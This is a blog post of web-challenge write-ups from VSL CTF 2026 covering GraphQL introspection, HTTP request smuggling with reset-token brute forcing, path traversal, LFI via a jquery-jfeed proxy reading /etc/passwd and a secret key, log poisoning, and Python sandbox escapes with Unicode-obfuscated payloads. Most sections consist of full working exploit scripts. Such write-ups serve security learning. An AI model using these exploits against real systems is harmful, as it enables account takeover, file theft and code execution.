+++
date = '2026-01-29T08:56:41+07:00'
title = 'VSL CTF 2026 Web Writeups'
tags = ['VSL CTF 2026', 'CTFs']
description = 'My writeup for web challs in VSL CTF 2026'
draft = false

[cover]
  image = '/images/posts/vsl-ctf-2026-cover.jpg'
  alt = 'VSL CTF 2026 Web Writeups'
  caption = 'VSL CTF 2026 Web Writeups'
  relative = false
+++

## mrGraph

<p class="highlight">Goal</p>

Leveraging the GraphQL Injection to get the flag in the database.

<p class="highlight">My Solution</p>

The new intern made a website, there must be vulnerability. Examining sources of available pages, we can find a route that we can take advantage of `/api/graphql` (visible in `/users` route).

In order to know all the schemas existed in the database, run this in the Console tab of browser:

```javascript
fetch('/api/graphql', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        query: `
        query {
            __schema {
                types {
                    name
                    fields {
                        name
                    }
                }
            }
        }`,
    }),
})
    .then(response => response.json())
    .then(data => {
        console.log(JSON.stringify(data, null, 2));
    });
```

Got a really suspicious `postPassword` field:

```json
{
    "name": "PostType",
    "fields": [
    // ...
    {
        "name": "postPassword"
    },
    {
        "name": "isHidden"
    },
    // ...
    ]
},
```

Seems like the flag is the value of `postPassword` field of a post which `isHidden`.

```javascript
fetch('/api/graphql', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        query: `
        query {
            posts {
                id
                title
                postPassword
                isHidden
                content
            }
        }`,
    }),
})
    .then(response => response.json())
    .then(data => {
        console.log(JSON.stringify(data, null, 2));
    });
```

Got:

```json
{
    "data": {
        "posts": [
            {
                "id": 2,
                "title": "Advanced GraphQL Patterns",
                "postPassword": null,
                "isHidden": false,
                "content": "Learn about schema design, caching strategies, and optimization techniques for GraphQL APIs. We will cover real-world examples from production systems."
            },
            {
                "id": 1,
                "title": "Getting Started with GraphQL",
                "postPassword": null,
                "isHidden": false,
                "content": "GraphQL is a query language for APIs. It provides a more efficient, powerful and comfortable way to query data than traditional REST APIs. In this post, we will explore the basics of GraphQL."
            },
            {
                "id": 3,
                "title": "API Security Best Practices",
                "postPassword": null,
                "isHidden": false,
                "content": "Implementing proper authentication and authorization in your APIs is crucial. This article covers JWT, OAuth2, and other security mechanisms."
            }
        ]
    }
}
```

Still cannot get the hidden post, now I try to get the specific post id `4`:

```javascript
fetch('/api/graphql', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        query: `
        query {
            post(id: 4) {
                id
                title
                content
                postPassword
                isHidden
            }
        }`,
    }),
})
    .then(response => response.json())
    .then(data => {
        console.log(JSON.stringify(data, null, 2));
    });
```

Got the flag `VSL{y0u_r34lly_kn0w_4b0u7_6r4ph_d0n7_y4}`:

```json
{
    "data": {
        "post": {
            "id": 4,
            "title": "Hidden Admin Notes",
            "content": "This post contains confidential information and should not be accessible to regular users. The security of this system depends on keeping this hidden.",
            "postPassword": "VSL{y0u_r34lly_kn0w_4b0u7_6r4ph_d0n7_y4}",
            "isHidden": true
        }
    }
}
```

## CornHub

<p class="highlight">Goal</p>

Get admin priviledges in order to read 2 flag files in the server.

<p class="highlight">My Solution</p>

There are 3 steps in order to get the flag content:
| # | Vulnerability | Purpose |
| :-- | :--------------: | :-------------------------------------------------: |
| 1 | Request Smuggling | Takeover admin account via the forgot password route |
| 2 | Broken Authentication | Brute-forcing the password reset token |
| 3 | Path Traversal | Reading flag files using environment variable expansion (e.g., `$HOME`) |

<p class="highlight">Step 1: Account Takeover via Request Smuggling</p>

Admin access is required to read files, but we didn't have the admin password. However, there is a internal endpoint `/auth/forgot_password` that we can take advantage of to have the reset password token.

We sent a request to `/debug` and tell frontend to forward a `Content-Length: 6` header to the backend, however, actually we sent a bigger body containing another request to `/auth/forgot_password` (smuggled request).

The backend read the first 6 bytes (`data=1`), stopped, and then interpreted the rest of our data as a new request to `/auth/forgot_password`.

<p class="highlight">Step 2: Brute-forcing the Reset Token</p>

In `auth_service.py`, the token is generated by 4 content `email`, `username`, `dob` and `timestamp`:

```python
timestamp = datetime.datetime.now().strftime("%Y:%m:%d-%H:%M")
base = f"{user['email']}{user['username']}{user['dob']}{timestamp}"
token = hash_sha256(base)
```

We already knew 3 details from the initial query in `db.py`:

```
Username: admin
Email: admin@cornhub.com
DOB: 2005-08-05
```

The unknown `timestamp` can be brute-forced. We create SHA256 hashes for every minute within a +/- 14-hour of current time, until the tokens match and we can change the password to whatever we want.

<p class="highlight">Step 3: Bypassing Filters and Get the Flag</p>

There are several filters from frontend and backend preventing us to read the flag files normally:

The frontend WAF, just check with path `/documents` so we can use `/documents/` to bypass this.

```javascript
app.use((req, res, next) => {
    // ...

    // THE CHECK
    if (req.path === '/documents' && req.method === 'POST') {
        //
        const requestStr = JSON.stringify(req.body);
        if (requestStr.includes('flag_2.txt')) {
            //
            return res.status(403).json({
                error: 'Access denied - forbidden content detected',
            });
        }
    }

    next();
});
```

The backend filter:

```python
def filter(file_name: str):
    if ".." in file_name or file_name.startswith("/"):  #
        raise HTTPException(status_code=403, detail="Forbidden character(s)")
```

However the main logic of `search_document` still have vulnerability:

```python
def search_document(file_name: str = Form(...)):
    document_dir = "/cornhub"

    try:
        filter(file_name)                                # 1. Check runs first
        normalize_name = os.path.expandvars(file_name)   # 2. Variable expansion happens AFTER check
        file_path = os.path.join(document_dir, normalize_name) # 3. Path joining
        # ...
```

The bypass payload that we can use: `$HOME/flag_1.txt` and `$HOME/flag_2.txt`.

<p class="highlight">Exploit Code</p>

```python
import requests
import hashlib
import datetime
import json
import time
import sys
import base64

TARGET = "http://124.197.22.141:6336"
ADMIN_USER = "admin"
ADMIN_PASS = "pwned"
ADMIN_DATA = "admin@cornhub.comadmin2005-08-05" # email + user + dob

s = requests.Session()

def smuggle(payload):
    wrapper = "data=1"
    full_data = wrapper + payload
    # tell frontend content-length is 6, but send much more.
    headers = json.dumps({"Content-Length": "6", "Content-Type": "application/x-www-form-urlencoded"})

    try:
        # use a dummy token to bypass simple frontend checks
        s.post(f"{TARGET}/debug", data={"access_token": "dummy", "headers": headers, "data": full_data}, timeout=0.1)
    except:
        pass

def generate_token(ts):
    return hashlib.sha256(f"{ADMIN_DATA}{ts}".encode()).hexdigest()

def main():
    print("[1] Smuggling /auth/forgot_password")
    smuggle(
        "POST /auth/forgot_password HTTP/1.1\r\n"
        "Host: backend\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 23\r\n\r\n"
        "email=admin@cornhub.com"
    )
    time.sleep(2)

    print("[2] Brute-forcing timestamp of the reset token")
    now = datetime.datetime.now(datetime.timezone.utc)
    timestamps = set()
    for h in range(-13, 14):
        for m in [-2, -1, 0, 1, 2]:
            timestamps.add((now + datetime.timedelta(hours=h, minutes=m)).strftime("%Y:%m:%d-%H:%M"))

    valid_token = None
    for i, ts in enumerate(timestamps):
        if i % 10 == 0: print(f"    Trying timestamps... ({i}/{len(timestamps)})", end="\r")

        token = generate_token(ts)
        body = f"username={ADMIN_USER}&token={token}&new_password={ADMIN_PASS}"

        # send update password request with created brute-forced token
        smuggle(
            "POST /auth/update_password HTTP/1.1\r\n"
            "Host: backend\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n\r\n"
            f"{body}"
        )

        # check if the correct reset token is used to update password
        try:
            res = s.post(f"{TARGET}/login", data={"username": ADMIN_USER, "password": ADMIN_PASS}, timeout=0.5)
            if "access_token" in res.text:
                valid_token = res.json()['access_token']
                print(f"\n[+] password reset. Timestamp: {ts}")
                break
        except:
            pass

        time.sleep(0.01)

    if not valid_token:
        print("\n[-] failed to reset password.")
        sys.exit(1)

    print(f"[3] Retrieving flags")
    # use $HOME, creating an absolute path and bypass the filter
    for filename in ["flag_1.txt", "flag_2.txt"]:
        try:
            # use /documents/ to bypass frontend waf
            r = s.post(f"{TARGET}/documents/", data={
                "file_name": f"$HOME/{filename}",
                "access_token": valid_token
            })
            content = r.json().get('content')
            if content:
                print(f"\n{filename}: {base64.b64decode(content).decode().strip()}")
            else:
                print(f"\n{filename}: Failed ({r.text})")
        except Exception as e:
            print(f"\n{filename}: Error {e}")

if __name__ == "__main__":
    main()
```

## Key Game

<p class="highlight">Goal</p>

Leveraging vulnerability in libarary of the website and get the flag.

<p class="highlight">My Solution</p>

Doing some Reconnaissance we can find a library that is installed in `Dockerfile` but that never used by the website:

```
RUN apt update && apt install libjs-jquery-jfeed -y
```

This library is known for a vunerability, which includes an example proxy file `proxy.php` and this proxy is vulnerable to Local File Inclusion (LFI). Tried visiting `http://124.197.22.141:7878/javascript/jquery-jfeed/proxy.php?url=file:///etc/passwd`, got:

```
This page contains the following errors:
error on line 1 at column 1: Start tag expected, '<' not found
Below is a rendering of the page up to the first error.
```

Although this is an error, but it confirms we can read file, because it set `Content-Type: application/xml` so the format of `/etc/passwd` is not valid. Tried this to get the file:

```bash
curl "http://124.197.22.141:7878/javascript/jquery-jfeed/proxy.php?url=file:///etc/passwd"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

From this we can get `/var/www/secret_key.txt` and `/tmp/sess_<MY_SESSION_ID>`, then we can loop through 40 steps of the game and get the flag. Expoit script:

```python
import requests
import hashlib
import re

HOST = "http://124.197.22.141:7878"
PROXY_PATH = "/javascript/jquery-jfeed/proxy.php"
SESSION_PATHS = [
    "/tmp/sess_{}",
    "/var/lib/php/sessions/sess_{}",
    "/tmp/php_sessions/sess_{}"
]

def get_file_content(session, file_path):
    try:
        url = f"{HOST}{PROXY_PATH}"
        res = session.get(url, params={'url': f'file://{file_path}'})
        return res.text
    except:
        return ""

def parse_path(session_data):
    try:
        matches = re.findall(r'i:(\d+);i:(\d+);', session_data)
        if not matches: return []
        path_map = {int(k): int(v) for k, v in matches}
        return [path_map[i] for i in range(len(path_map))]
    except:
        return []

def solve():
    s = requests.Session()
    s.get(f"{HOST}/index.php", params={'act': 'respawn'})
    sess_id = s.cookies.get('PHPSESSID')

    if not sess_id:
        print("[-] Error: No Session ID")
        return

    # 1. Steal Secret Key
    key_data = get_file_content(s, "/var/www/secret_key.txt")
    secret_key = key_data.strip().split('\n')[-1]

    if not secret_key:
        print("[-] Error: Could not read secret key")
        return

    # 2. Steal Random Path from Session File
    path_list = []
    for path_template in SESSION_PATHS:
        content = get_file_content(s, path_template.format(sess_id))
        if "path|a:40" in content:
            path_list = parse_path(content)
            break

    if len(path_list) != 40:
        print("[-] Error: Could not find session file or parse path")
        return

    # 3. Auto-play
    for step, side in enumerate(path_list):
        # Calculate Signature
        raw_sig = f"{secret_key}|{step}|{side}"
        signature = hashlib.md5(raw_sig.encode()).hexdigest()

        # Move
        params = {'act': 'move', 'step': step, 'side': side, 'h': signature}
        res = s.get(f"{HOST}/index.php", params=params)

        if "VSL{" in res.text:
            print(f"[SUCCESS] {res.text.split('|')[-1]}")
            return
        elif "You Died" in res.text:
            print("[-] Error: Died unexpectedly.")
            return

if __name__ == "__main__":
    solve()
```

## Trust-Issues

<p class="highlight"></p>

Log Poisoning (to become admin) and HTTP Parameter Pollution (to execute code) and get the flag.

<p class="highlight">My Solution</p>

Solve script:

```python
import requests
import socket
from urllib.parse import urlparse
import time

TARGET = "http://124.197.22.141:8000"

def poison_log_raw(target_url):
    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port if parsed.port else 80

    payload = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Origin: attacker\nuser=admin\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            s.sendall(payload.encode())
            s.recv(4096)
    except Exception:
        pass

def exploit():
    poison_log_raw(TARGET)

    time.sleep(1)

    s = requests.Session()

    escape_payload = (
        "[c for c in ().__class__.__base__.__subclasses__() "
        "if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['open']('flag.txt').read()"
    )

    params = [
        ('text', '1'),
        ('text', escape_payload)
    ]

    try:
        resp = s.get(f"{TARGET}/calc", params=params)
        if "VSL{" in resp.text:
            print(resp.text.strip())
    except Exception:
        pass

if __name__ == "__main__":
    exploit()
```

## PyRunner

<p class="highlight">Goal</p>

Bypassing Python sandbox filters and get the flag.

<p class="highlight">My Solution</p>

Get current and root directory files and folders:

```python
try:
    print("[+] Listing Directory...")
    G = ().__ｃｌａｓｓ__.__ｂａｓｅ__.__ｓｕｂｃｌａｓｓｅｓ__
    tgt = G()[-2].__ｉｎｉｔ__.__ｇｌｏｂａｌｓ__
    builtins = tgt['__buil'+'tins__']
    importer = builtins['__im'+'port__']
    os = importer('os')
    print("Current Dir:", os.listdir('.'))
    print("Root Dir:", os.listdir('/'))

except Exception as e:
    print(f"[-] Error: {e}")
```

Got `flag-16c4977d-be42-4bd6-a229-739e180dc37a.txt`:

```
[+] Listing Directory...

Current Dir: ['a', '__pycache__', 'flag-16c4977d-be42-4bd6-a229-739e180dc37a.txt', 'templates.py', 'app.py', 'sandbox.py', 'requirements.txt']

Root Dir: ['lib64', 'tmp', 'lib', 'sys', 'dev', 'mnt', 'root', 'home', 'usr', 'media', 'etc', 'srv', 'sbin', 'bin', 'boot', 'proc', 'run', 'var', 'opt', 'app', '.dockerenv', 'flag-16c4977d-be42-4bd6-a229-739e180dc37a.txt']
```

Read `flag-16c4977d-be42-4bd6-a229-739e180dc37a.txt`:

```python
try:
    G = ().__ｃｌａｓｓ__.__ｂａｓｅ__.__ｓｕｂｃｌａｓｓｅｓ__
    tgt = G()[-2].__ｉｎｉｔ__.__ｇｌｏｂａｌｓ__

    opener = tgt['__buil'+'tins__']['op'+'en']

    flag_content = opener('flag-16c4977d-be42-4bd6-a229-739e180dc37a.txt').read()

    print(f"[!!!] FLAG: {flag_content}")

except Exception as e:
    print(f"Final Error: {e}")
```

## PyRunner2

<p class="highlight">Goal</p>

Bypassing Python sandbox filters and get the flag.

<p class="highlight">My Solution</p>

Get current files and folders:

```python
try:
    print("[+] Stack Escape (No f-strings)...")

    raise Exception("Yield")

except Exception as e:
    tb = e.__ｔｒａｃｅｂａｃｋ__
    frm = tb.ｔｂ＿ｆｒａｍｅ
    prv = frm.ｆ＿ｂａｃｋ
    sv_g = prv.ｆ＿ｇｌｏｂａｌｓ

    b_key = "".join(('__buil', 'tins__'))
    tools = sv_g[b_key]

    i_key = "".join(('__im', 'port__'))

    try:
        imp = tools[i_key]
    except:
        try:
            get_attr = tools.ｇｅｔａｔｔｒ
        except:
            get_attr = tools['getattr']

        imp = get_attr(tools, i_key)

    my_os = imp('os')

    print("Files:", my_os.listdir('.'))

except Exception as e:
    print("Error:", e)
```

Got suspicious `a` file:

```
[+] Stack Escape (No f-strings)...

Files: ['__pycache__', 'a', 'requirements.txt', 'sandbox.py', 'templates.py', 'app.py']
```

Read `a` file:

```python
try:
    print("[+] Extracting File 'a' and Scanning Root...")
    raise Exception("Yield")

except Exception as e:

    tb = e.__ｔｒａｃｅｂａｃｋ__
    frm = tb.ｔｂ＿ｆｒａｍｅ
    prv = frm.ｆ＿ｂａｃｋ
    sv_g = prv.ｆ＿ｇｌｏｂａｌｓ

    b_key = "".join(('__buil', 'tins__'))
    tools = sv_g[b_key]

    i_key = "".join(('__im', 'port__'))
    try:
        imp = tools[i_key]
    except:
        get_attr = tools.ｇｅｔａｔｔｒ
        imp = get_attr(tools, i_key)

    my_os = imp('os')

    try:
        o_key = "".join(('op', 'en'))
        try:
            opener = tools[o_key]
        except:
            opener = tools.ｏｐｅｎ
        print("Content of 'a':", opener('a').read())
    except Exception as e2:
        print("Could not read 'a':", e2)
except Exception as e:
    print("Error:", e)
```
